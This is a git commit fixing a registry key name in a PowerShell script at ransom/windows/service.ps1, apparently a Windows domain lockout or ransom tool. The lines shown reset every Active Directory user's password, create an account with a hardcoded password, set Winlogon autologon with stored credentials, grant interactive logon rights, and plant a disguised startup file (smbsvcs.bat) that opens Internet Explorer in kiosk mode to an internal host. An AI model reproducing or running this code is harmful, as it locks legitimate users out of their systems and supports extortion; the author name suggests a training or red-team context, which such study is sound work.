a8d8d4ca691d1176079ef9e211025012b44059f1
6903-EthicalHacker <44905220+6903-EthicalHacker@users.noreply.github.com>
2018-11-29 01:50:02 -0800

    Fixing Another typo

--- ransom/windows/service.ps1
+++ ransom/windows/service.ps1
@@ -8,7 +8,7 @@ Get-ADUser -filter * | Set-ADAccountPassword -Reset -NewPassword(ConvertTo-Secur
 New-ADUser $DefaultUsername -AccountPassword (ConvertTo-SecureString "P@ssw0rd!" -asPlainText -Force) -Enabled $True
 $RegPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
 Set-ItemProperty $RegPath "AutoAdminLogon" -Value "1" -type String 
-Set-ItemProperty $RegPath "DomainUsername" -Value "$DomainUser" -type String 
+Set-ItemProperty $RegPath "DefaultUsername" -Value "$DomainUser" -type String 
 Set-ItemProperty $RegPath "DefaultPassword" -Value "$DefaultPassword" -type String
 ntrights.exe +r "SeInteractiveLogonRight" -u $DomainUser
 New-Item -Path 'C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup' -Name smbsvcs.bat -Value """C:\Program Files\Internet Explorer\iexplore.exe"" -k ""http://10.0.0.45"""
